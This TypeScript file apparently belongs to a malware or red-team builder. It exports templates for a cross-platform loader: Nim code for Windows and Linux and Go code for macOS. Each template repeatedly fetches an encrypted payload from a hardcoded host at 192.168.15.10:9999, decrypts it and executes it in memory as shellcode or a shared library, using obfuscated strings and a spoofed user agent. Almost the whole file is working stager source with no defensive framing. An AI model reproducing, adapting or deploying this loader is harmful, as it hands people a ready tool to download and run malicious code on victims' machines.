/** Strip common leading whitespace from indented template literals (editor layout only). */
function dedent(source: string): string {
  const lines = source.replace(/\r\n/g, "\n").split("\n");
  if (lines[0] === "") lines.shift();
  while (lines.length > 0 && lines[lines.length - 1].trim() === "") lines.pop();

  const nonEmpty = lines.filter((line) => line.trim().length > 0);
  if (nonEmpty.length === 0) return "";
  const indent = Math.min(
    ...nonEmpty.map((line) => /^[\t ]*/.exec(line)?.[0].length ?? 0)
  );
  return lines
    .map((line) => (line.trim().length === 0 ? "" : line.slice(indent)))
    .join("\n");
}

export const loaderCustomChannelWindows = dedent(`
  from std/strutils import join
  import std/tables
  import ../utils/global
  import ../utils/network/http as nhttp
  import ../utils/crypt/transport
  import ../utils/stage
  import ../capabilities/sleep/core

  var customUrl = obf("http://192.168.15.10:9999/payload.bin")
  var customCookies = toTable([
    (obf("session"), obf("example")),
    (obf("token"), obf("example")),
  ])
  var customHeaders = toTable([
    (obf("User-Agent"), obf("Mozilla/5.0")),
    (obf("X-Custom-Header"), obf("example")),
  ])

  proc decrypt(raw, key: string): string =
    tryCryptDecrypt(key, raw)

  proc http_get(
      url: string;
      cookies: Table[string, string] = initTable[string, string]();
      headers: Table[string, string] = initTable[string, string]()
  ): tuple[code: uint16, body: string] =
    var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
    for key, value in headers:
      pairs.add((key, value))
    var cookieParts: seq[string] = @[]
    for key, value in cookies:
      cookieParts.add key & obf("=") & value
    if cookieParts.len > 0:
      pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
    let r = nhttp.winHttpPerform(url, "GET", "", pairs)
    (code: r.code, body: r.body)

  proc main*(): void =
    while true:
      let resp = http_get(customUrl, customCookies, customHeaders)
      if resp.code == 200 and resp.body.len > 0:
        let plain = decrypt(resp.body, aesKey)
        let src = if plain.len > 0: plain else: resp.body
        if src.len > 0:
          var payload = newSeq[byte](src.len)
          copyMem(addr payload[0], addr src[0], src.len)
          runShellcode(payload)
          return
      sleep_now()
`);

export const loaderCustomChannelLinux = dedent(`
  import std/httpclient
  from std/strutils import join
  import std/tables
  import ../utils/global
  import ../utils/crypt/transport
  import ../utils/stage
  import ../capabilities/sleep

  var customUrl = obf("http://192.168.15.10:9999/payload.so")
  var customCookies = toTable([
    (obf("session"), obf("example")),
    (obf("token"), obf("example")),
  ])
  var customHeaders = toTable([
    (obf("User-Agent"), obf("Mozilla/5.0")),
    (obf("X-Custom-Header"), obf("example")),
  ])

  proc decrypt(raw, key: string): string =
    tryCryptDecrypt(key, raw)

  proc http_get(
      url: string;
      cookies: Table[string, string] = initTable[string, string]();
      headers: Table[string, string] = initTable[string, string]()
  ): tuple[code: uint16, body: string] =
    var client = httpclient.newHttpClient(userAgent = obf(""))
    var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
    for key, value in headers:
      pairs.add((key, value))
    var cookieParts: seq[string] = @[]
    for key, value in cookies:
      cookieParts.add key & obf("=") & value
    if cookieParts.len > 0:
      pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
    client.headers = httpclient.newHttpHeaders(pairs)
    try:
      let resp = httpclient.get(client, url)
      (code: uint16(httpclient.code(resp)), body: httpclient.body(resp))
    except CatchableError:
      (code: 0'u16, body: obf(""))
    finally:
      httpclient.close(client)

  proc main*(): void =
    while true:
      let resp = http_get(customUrl, customCookies, customHeaders)
      if resp.code == 200 and resp.body.len > 0:
        let plain = decrypt(resp.body, aesKey)
        let src = if plain.len > 0: plain else: resp.body
        if src.len > 0:
          var payload = newSeq[byte](src.len)
          copyMem(addr payload[0], addr src[0], src.len)
          runSharedLibrary(payload)
          return
      sleep_now()
`);

export const loaderCustomChannelMacos = dedent(`
  package routine

  import (
  	"io"
  	"net/http"
  	"strings"
  	"time"

  	"loader/capabilities"
  	global "loader/utils"
  	"loader/utils/crypt"
  	"loader/utils/obf"
  	"loader/utils/stage"
  )

  var customUrl = obf.S("http://192.168.15.10:9999/payload.app")

  const delaySeconds = 2

  var customCookies = map[string]string{
  	obf.S("session"): obf.S("example"),
  	obf.S("token"):   obf.S("example"),
  }

  var customHeaders = map[string]string{
  	obf.S("User-Agent"):      obf.S("Mozilla/5.0"),
  	obf.S("X-Custom-Header"): obf.S("example"),
  }

  func customDecrypt(raw, key string) string {
  	return crypt.TryCryptDecrypt(key, raw)
  }

  func customHTTPGet(url string, cookies map[string]string, headers map[string]string) (uint16, string) {
  	req, err := http.NewRequest(http.MethodGet, url, nil)
  	if err != nil {
  		return 0, obf.S("")
  	}
  	req.Header.Set(obf.S("User-Agent"), obf.S(""))
  	req.Header.Set(obf.S("Connection"), obf.S("close"))
  	for key, value := range headers {
  		req.Header.Set(key, value)
  	}
  	var cookieParts []string
  	for key, value := range cookies {
  		cookieParts = append(cookieParts, key+obf.S("=")+value)
  	}
  	if len(cookieParts) > 0 {
  		req.Header.Set(obf.S("Cookie"), strings.Join(cookieParts, obf.S("; ")))
  	}
  	client := &http.Client{Timeout: 60 * time.Second}
  	resp, err := client.Do(req)
  	if err != nil {
  		return 0, obf.S("")
  	}
  	defer resp.Body.Close()
  	body, err := io.ReadAll(resp.Body)
  	if err != nil {
  		return uint16(resp.StatusCode), obf.S("")
  	}
  	return uint16(resp.StatusCode), string(body)
  }

  func CustomMain() {
  	for {
  		code, body := customHTTPGet(customUrl, customCookies, customHeaders)
  		if code == 200 && len(body) > 0 {
  			plain := customDecrypt(body, global.AesKey)
  			src := plain
  			if len(src) == 0 {
  				src = body
  			}
  			if len(src) > 0 {
  				stage.RunSharedLibrary([]byte(src))
  				return
  			}
  		}
  		capabilities.Sleep_now(delaySeconds)
  	}
  }
`);

export const loaderCustomChannelBase = (os: "windows" | "linux" | "macos"): string => {
  if (os === "macos") return loaderCustomChannelMacos;
  if (os === "linux") return loaderCustomChannelLinux;
  return loaderCustomChannelWindows;
};
